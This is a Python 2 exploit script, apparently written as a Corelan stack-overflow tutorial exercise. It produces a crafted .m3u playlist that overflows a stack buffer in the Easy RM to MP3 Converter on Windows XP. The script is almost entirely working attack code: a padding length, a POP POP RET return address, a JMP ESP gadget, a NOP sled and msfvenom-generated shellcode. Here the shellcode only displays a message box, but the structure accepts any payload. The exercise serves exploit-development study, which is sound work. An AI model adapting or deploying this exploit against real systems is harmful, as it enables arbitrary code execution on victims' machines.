#!/usr/bin/env python
#
# Script Name   : easy-rm-sploit3.py
# Tutorial Link : https://www.corelan.be (Part 2 Stack Based Overflows)
# Req Modules   : None standard
# Author        : wetw0rk
# Target OS     : Windows XP
# Version       : 1.0
# Python Ver.   : 2.7
# Description   : Simply an exploit that takes advantage of a stack
#                 buffer overflow in the Easy RM to MP3 Conversion Utility
#                 in this example using the pop pop ret technique.
#

import sys, struct


# msfvenom -a x86 --platform windows -b "\x00\x09\x0a"
# -p windows/messagebox TEXT="Corelan Rocks" -f python
buf =  ""
buf += "\xba\x70\x67\x27\x37\xda\xd8\xd9\x74\x24\xf4\x5f\x31"
buf += "\xc9\xb1\x43\x31\x57\x15\x83\xef\xfc\x03\x57\x11\xe2"
buf += "\x85\xbe\xcc\xac\xbc\x35\x37\x27\x0f\x64\x85\xb0\x5e"
buf += "\x41\x8e\xb5\xd1\x61\xc4\xbc\x1d\x09\xac\x5c\x96\x4b"
buf += "\x59\xd6\xd6\x73\xd2\xde\x1e\x3b\xfc\x6b\xad\x9a\xfd"
buf += "\x42\xae\xfc\x9e\xef\x3c\xdb\x7a\x7b\xf9\x1f\x08\x2f"
buf += "\x29\x18\x0f\x3a\xa2\x92\x17\x31\xee\x02\x29\xae\xed"
buf += "\x77\x60\xbb\xc5\xfc\x73\x55\x14\xfc\x45\x69\xaa\xae"
buf += "\x22\xa9\x26\xa8\xeb\xe5\xcb\xb7\x2c\x12\x27\x8c\xce"
buf += "\xc1\xef\x86\xcf\x81\xb5\x4c\x11\x7d\x2f\x06\x1d\xca"
buf += "\x24\x42\x02\xcd\xd1\xf8\x3e\x46\x24\x17\xb7\x1c\x02"
buf += "\xfb\xa9\x5f\xf8\x0b\x03\xb4\x75\xee\xda\xf6\xed\x7f"
buf += "\x92\xf8\x01\x2d\xc3\x9a\x26\x2d\xec\x2c\x9d\xd6\xa8"
buf += "\x51\xc5\x35\xbd\x2a\xe9\x9d\x10\xdd\x9f\x21\x6b\xe2"
buf += "\x16\x98\x9c\x75\x44\x4f\xbd\xc4\xfc\xbc\x8f\xe8\x98"
buf += "\xaa\x9a\x87\x05\x59\x55\xb3\x4d\xc1\xb1\x49\xc4\x1c"
buf += "\xef\xb2\x83\xe4\x99\x8f\x7b\x5e\x31\xad\x36\x1c\xc5"
buf += "\xae\xec\x0e\x22\x91\x13\x51\x4d\x46\x84\xd6\xea\xb7"
buf += "\x32\x46\x6c\xdd\x80\xe0\x3f\x78\x77\x82\x8e\x59\xff"
buf += "\x38\xd5\x57\x76\x23\x7d\x1b\xd0\x84\x5e\xb3\xb2\xab"
buf += "\xfd\x28\x5a\x58\x63\xc1\xba\xc8\x20\x72\xc8\x6d\x96"
buf += "\x45\xa4\x22\xfc\x58\x3d\x5b\xcd\xb0\x6f\xcf\x7f\x67"
buf += "\x70\x3f\x4e\x47\xde\x3f\xe4\x4f"

file = "panda.m3u"                              # file we will be creating
junk = "\x41" * 26073                           # junk to insert to file

eip = struct.pack('<L',0x01876a10)		# MSRMfilter01.dll (POP POP RET)
jmp_esp = struct.pack('<L', 0x77246FA1)         # JMP ESP

prepend_esp = "FRYS"                            # add 4 bytes so ESP points directly to shellcode

shellcode = "\x90"*8                            # 8 bytes offset
shellcode += jmp_esp                            # address to return via pop pop ret (jmp esp)
shellcode += "\x90"*50 + buf                    # real shellcode here

junk += eip + prepend_esp + shellcode           # everything to be written

open_file = open(file, 'w')			# open file in write mode
open_file.write(junk)				# write junk to file
open_file.close()				# close file
print "[*] m3u file saved to %s" % (file)
